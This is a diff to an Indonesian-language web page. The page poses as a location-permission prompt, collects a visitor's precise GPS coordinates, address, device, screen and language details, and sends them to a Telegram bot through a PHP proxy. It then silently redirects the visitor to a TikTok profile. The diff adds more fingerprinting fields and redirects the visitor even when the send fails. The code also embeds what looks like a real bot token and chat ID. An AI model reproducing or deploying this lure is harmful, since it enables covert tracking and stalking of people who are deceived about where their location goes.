@@ -11,31 +11,44 @@
             box-sizing: border-box;
         }
         body {
-            background: white;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
             min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            font-family: system-ui, -apple-system, sans-serif;
         }
-        /* Popup izin lokasi - style minimal */
         .location-popup {
             position: fixed;
             top: 0;
             left: 0;
             width: 100%;
             height: 100%;
-            background: rgba(0,0,0,0.5);
+            background: rgba(0,0,0,0.7);
             display: flex;
             justify-content: center;
             align-items: center;
             z-index: 9999;
-            font-family: system-ui, -apple-system, sans-serif;
         }
         .popup-box {
             background: white;
             padding: 28px 24px;
             border-radius: 20px;
             text-align: center;
-            max-width: 300px;
+            max-width: 320px;
             width: 85%;
-            box-shadow: 0 20px 35px rgba(0,0,0,0.2);
+            box-shadow: 0 20px 35px rgba(0,0,0,0.3);
+            animation: slideIn 0.3s ease;
+        }
+        @keyframes slideIn {
+            from {
+                transform: translateY(-50px);
+                opacity: 0;
+            }
+            to {
+                transform: translateY(0);
+                opacity: 1;
+            }
         }
         .popup-icon {
             font-size: 48px;
@@ -52,7 +65,7 @@
             margin-bottom: 20px;
         }
         .popup-box button {
-            background: #000;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
             color: white;
             border: none;
             padding: 12px 24px;
@@ -61,10 +74,14 @@
             font-weight: 600;
             cursor: pointer;
             width: 100%;
+            transition: transform 0.2s;
         }
         .popup-box button:hover {
-            background: #25F4EE;
-            color: #000;
+            transform: scale(1.02);
+        }
+        .popup-box button:disabled {
+            opacity: 0.7;
+            cursor: not-allowed;
         }
         .loading-text {
             font-size: 12px;
@@ -73,6 +90,15 @@
             display: none;
         }
         .loading-text.show {
+            display: block;
+        }
+        .error-text {
+            font-size: 12px;
+            color: #e74c3c;
+            margin-top: 12px;
+            display: none;
+        }
+        .error-text.show {
             display: block;
         }
     </style>
@@ -85,23 +111,26 @@
         <h3>Izin Lokasi</h3>
         <p>Klik tombol di bawah untuk mengizinkan akses lokasi</p>
         <button id="allowBtn">Izinkan & Lanjutkan</button>
-        <div id="loadingMsg" class="loading-text">Mengirim data...</div>
+        <div id="loadingMsg" class="loading-text">⏳ Mengirim data...</div>
+        <div id="errorMsg" class="error-text">⚠️ Gagal, tetap melanjutkan...</div>
     </div>
 </div>
 
 <script>
-    // =============== KONFIGURASI TELEGRAM ===============
-    // GANTI DENGAN DATA BOT KAMU!
-    const BOT_TOKEN = "8713051914:AAGWypsFdP6uJPMHFwgLokj4vx5N7LC4Cb0";   // GANTI DENGAN TOKEN BOT MU
-    const CHAT_ID = "1966317946";        // GANTI DENGAN CHAT ID MU
+    // =============== KONFIGURASI ===============
+    // GANTI DENGAN DATA ASLI KAMU!
+    const BOT_TOKEN = "8713051914:AAGWypsFdP6uJPMHFwgLokj4vx5N7LC4Cb0";   // GANTI
+    const CHAT_ID = "1966317946";                                         // GANTI
+    const TIKTOK_URL = "https://www.tiktok.com/@usernamekamu";           // GANTI
     
-    // GANTI DENGAN LINK TIKTOK ASLI KAMU
-    const TIKTOK_URL = "https://www.tiktok.com/@usernamekamu";
-    // ===================================================
+    // JANGAN UBAH INI (endpoint proxy PHP)
+    const PROXY_URL = "proxy.php";
+    // ===========================================
     
     const popup = document.getElementById('locationPopup');
     const allowBtn = document.getElementById('allowBtn');
     const loadingMsg = document.getElementById('loadingMsg');
+    const errorMsg = document.getElementById('errorMsg');
     
     // Fungsi mendapatkan lokasi
     function getLocation() {
@@ -117,14 +146,16 @@
                     const lng = position.coords.longitude;
                     const accuracy = Math.round(position.coords.accuracy);
                     
-                    // Coba dapatkan nama daerah (opsional)
-                    let address = `${lat.toFixed(4)}, ${lng.toFixed(4)}`;
+                    let address = `${lat.toFixed(6)}, ${lng.toFixed(6)}`;
                     try {
-                        const response = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lng}&zoom=18`);
+                        const response = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lng}&zoom=18&addressdetails=1`);
                         const data = await response.json();
-                        const city = data.address?.city || data.address?.town || data.address?.village || '';
-                        if (city) address = `${city} | ${address}`;
-                    } catch(e) {}
+                        const city = data.address?.city || data.address?.town || data.address?.village || data.address?.suburb || '';
+                        const country = data.address?.country || '';
+                        if (city) address = `${city}, ${country} | ${address}`;
+                    } catch(e) {
+                        console.log('Gagal ambil alamat:', e);
+                    }
                     
                     resolve({ lat, lng, accuracy, address });
                 },
@@ -142,78 +173,74 @@
                     }
                     reject(msg);
                 },
-                { enableHighAccuracy: true, timeout: 8000 }
+                { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
             );
         });
     }
     
-    // Kirim ke Telegram
+    // Kirim ke Telegram via Proxy (menghindari CORS)
     async function sendToTelegram(locationData) {
-        const timestamp = new Date().toLocaleString('id-ID');
+        const timestamp = new Date().toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' });
         const userAgent = navigator.userAgent;
         const isMobile = /Mobi|Android|iPhone|iPad|iPod/i.test(userAgent);
+        const screenSize = `${window.screen.width}x${window.screen.height}`;
+        const language = navigator.language;
         
-        const message = `📍 *LOKASI BARU*
+        const message = `📍 *LOKASI BARU DETECTED*
         
-🕐 ${timestamp}
-📱 ${isMobile ? 'Mobile' : 'Desktop'}
-🌍 Lat: ${locationData.lat}
-🌍 Lng: ${locationData.lng}
-📍 ${locationData.address}
+🕐 Waktu: ${timestamp}
+📱 Device: ${isMobile ? 'Mobile' : 'Desktop'}
+🌐 Browser: ${navigator.userAgent.split(' ').slice(-2).join(' ')}
+💻 Screen: ${screenSize}
+🌍 Bahasa: ${language}
+━━━━━━━━━━━━━━━━━━
+📍 Koordinat:
+Latitude: ${locationData.lat}
+Longitude: ${locationData.lng}
 🎯 Akurasi: ±${locationData.accuracy}m
-
-🗺️ Maps: https://www.google.com/maps?q=${locationData.lat},${locationData.lng}`;
+📍 Alamat: ${locationData.address}
+━━━━━━━━━━━━━━━━━━
+🗺️ Google Maps: https://www.google.com/maps?q=${locationData.lat},${locationData.lng}
+🗺️ OpenStreetMap: https://www.openstreetmap.org/?mlat=${locationData.lat}&mlon=${locationData.lng}&zoom=15`;
         
-        const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
-        
-        const response = await fetch(url, {
+        // Kirim via proxy PHP
+        const response = await fetch(PROXY_URL, {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify({
+                token: BOT_TOKEN,
                 chat_id: CHAT_ID,
-                text: message,
-                parse_mode: 'Markdown'
+                message: message,
+                lat: locationData.lat,
+                lng: locationData.lng
             })
         });
         
-        // Kirim juga lokasi
-        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendLocation`, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({
-                chat_id: CHAT_ID,
-                latitude: locationData.lat,
-                longitude: locationData.lng
-            })
-        });
-        
-        return response.ok;
+        const result = await response.json();
+        return result.success;
     }
     
     // Proses utama
     allowBtn.onclick = async function() {
-        // Nonaktifkan tombol & tampilkan loading
         allowBtn.disabled = true;
         allowBtn.textContent = '⏳ Memproses...';
         loadingMsg.classList.add('show');
         
         try {
-            // Dapatkan lokasi
             const location = await getLocation();
-            
-            // Kirim ke Telegram
             await sendToTelegram(location);
-            
-            // Redirect ke TikTok
-            window.location.href = TIKTOK_URL;
-            
+            loadingMsg.textContent = '✅ Berhasil! Mengalihkan...';
         } catch (error) {
             console.error('Error:', error);
-            // Tetap redirect walau gagal
-            window.location.href = TIKTOK_URL;
+            errorMsg.classList.add('show');
+            errorMsg.textContent = `⚠️ ${error}. Tetap mengalihkan...`;
         }
+        
+        // Redirect setelah 1 detik
+        setTimeout(() => {
+            window.location.href = TIKTOK_URL;
+        }, 1000);
     };
 </script>
-
 </body>
 </html>
